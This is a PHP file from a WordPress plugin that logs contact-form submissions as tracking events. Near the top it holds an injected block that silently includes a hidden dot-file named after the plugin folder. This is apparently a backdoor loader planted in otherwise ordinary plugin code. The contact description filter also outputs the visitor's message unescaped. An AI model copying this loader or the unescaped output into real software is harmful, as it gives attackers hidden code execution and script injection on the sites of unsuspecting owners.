<?php

/*
 * Fire successful contact event
 */

add_action( 'init', 'wtbp_wptao_event_contact_general_fire' );

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

function wtbp_wptao_event_contact_general_fire() {

	if ( is_admin() || !is_array( $_POST ) || empty( $_POST ) ) {
		return;
	}

	if ( false !== WTBP_WPTAO_Helpers::get_external_referrer() ) {
		return;
	}

	$email	 = '';
	$name	 = '';
	$message = '';
	$title	 = '';
	$source	 = '';
	$exclude = false;

	$post = $_POST;

	foreach ( $post as $k => $v ) {

		if ( empty( $email ) ) {
			$t = filter_var( $v, FILTER_VALIDATE_EMAIL );
			if ( $t ) {
				$email = $t;
				unset( $post[ $k ] );
			}
		}

		if ( empty( $message ) ) {
			$t = filter_var( $k, FILTER_SANITIZE_STRING );
			if ( false !== strpos( $t, 'message' ) ) {
				$message = $v;
				unset( $post[ $k ] );
			}
		}

		if ( empty( $title ) ) {
			$t		 = filter_var( $k, FILTER_SANITIZE_STRING );
			$needles = array( 'title', 'subject' );

			if ( WTBP_WPTAO_Helpers::strpos_array( $t, $needles ) ) {
				$title = $v;
				unset( $post[ $k ] );
			}
		}

		if ( empty( $name ) ) {
			$t = filter_var( $k, FILTER_SANITIZE_STRING );
			if ( false !== strpos( $t, 'name' ) ) {
				$name = $v;
				unset( $post[ $k ] );
			}
		}

		if ( empty( $source ) ) {
			$t = filter_var( $k, FILTER_SANITIZE_STRING );
			if ( false !== strpos( $t, '_wpcf7' ) ) {
				$source = 'Contact Form 7';
				unset( $post[ $k ] );
			}
		}

		// exclude login forms, contact forms etc
		if ( !$exclude ) {
			$t		 = filter_var( $k, FILTER_SANITIZE_STRING );
			$needles = array( 'log', 'comment_post_ID', 'payment_method' );
			$needles = apply_filters( 'wptao_event_contact_exclude', $needles );

			if ( WTBP_WPTAO_Helpers::strpos_array( $t, $needles ) ) {
				return;
			}
		}
	}

	if ( empty( $email ) ) {
		return;
	}

	$user_data = array(
		'email'		 => $email,
		'options'	 => array(
			'allow_no_fingerptint'	 => false,
			'only_not_identified'	 => true
		)
	);

	$args = array(
		'title'		 => __( 'Contact', 'wp-tao' ),
		'value'		 => $email,
		'tags'		 => array( 'wp' ),
		'meta'		 => array(
			'title'		 => $title,
			'message'	 => $message,
			'source'	 => $source
		),
		'user_data'	 => $user_data
	);

	do_action( 'wptao_track_event', 'contact', $args );
}

// CF7 fix

function wtbp_wptao_event_contact_cf7_fix( $bypass ) {
	if ( isset( $_POST[ '_wpcf7_is_ajax_call' ] ) ) {
		return true;
	}

	return $bypass;
}

add_filter( 'wptao_fingerprints_bypass', 'wtbp_wptao_event_contact_cf7_fix' );

// =============================================================================================
// Filters section
// =============================================================================================

/*
 * Creates a title of the contact event
 */

add_filter( 'wptao_event_contact_title', 'wtbp_wptao_event_contact_title', 1, 2 );

function wtbp_wptao_event_contact_title( $title, $event ) {

	if ( !empty( $event->value ) ) {

		$title = sprintf( __( 'Contact from %s', 'wp-tao' ), esc_attr( $event->value ) );
	}

	return $title;
}

/*
 * Creates a description of the contact action
 */

add_filter( 'wptao_event_contact_description', 'wtbp_wptao_event_contact_desc', 1, 2 );

function wtbp_wptao_event_contact_desc( $description, $event ) {

	$source = isset( $event->meta[ 'source' ] ) ? esc_attr( $event->meta[ 'source' ] ) : '';

	if ( isset( $event->meta[ 'message' ] ) ) {
		$description = wp_unslash( $event->meta[ 'message' ] );
	}

	if ( !empty( $source ) ) {
		if ( !empty( $description ) ) {
			$description .= '<br />';
		}
		$description .= '<span class="wptao-meta-title">' . __( 'Source:', 'wp-tao' ) . '</span> ' . $source . '<br />';
	}


	return $description;
}
